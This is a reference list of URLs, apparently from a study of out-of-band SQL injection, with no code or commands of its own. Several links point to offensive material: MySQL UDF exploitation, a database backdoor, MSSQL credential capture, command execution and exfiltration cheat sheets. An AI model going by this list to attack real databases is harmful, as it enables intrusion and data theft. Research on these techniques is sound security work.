- https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed 
- https://forums.aws.amazon.com/message.jspa?messageID=162499#162499
- https://www.percona.com/blog/2017/11/02/mysql-vs-mariadb-reality-check/
- https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file
- https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html
- https://github.com/mysqludf/lib_mysqludf_sys
- https://osandamalith.com/2018/02/11/mysql-udf-exploitation/
- https://github.com/y-ken/mysql-udf-http
- https://pure.security/simple-mysql-backdoor-using-user-defined-functions/
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
- https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478
- https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190
- https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190
- https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705
- https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html
- https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/
- https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/
- https://www.notsosecure.com/oob-exploitation-cheatsheet/
- https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/
- https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
- https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx
- https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql
- https://github.com/besimorhino/powercat
- https://livebook.manning.com/book/powershell-deep-dives/chapter-4/9
- https://github.com/infiniteloopltd/SQLHttp
- https://www.postgresql.org/docs/9.1/functions-admin.html#FUNCTIONS-ADMIN-GENFILE
- https://www.postgresql.org/docs/9.6/dblink.html
- https://www.postgresql.org/docs/9.6/contrib-dblink-connect-u.html
- https://www.postgresql.org/docs/9.1/libpq-connect.html
- https://www.acunetix.com/blog/articles/blind-out-of-band-sql-injection-vulnerability-testing-added-acumonitor/
- https://www.academia.edu/41117452/A_Study_of_Out-of-Band_Structured_Query_Language_Injection
- https://zenodo.org/record/3556347#.XsqM2zczZhF
- https://github.com/Gabriel-Labs/OOB-SQLi
- https://medium.com/bugbountywriteup/out-of-band-oob-sql-injection-87b7c666548b

---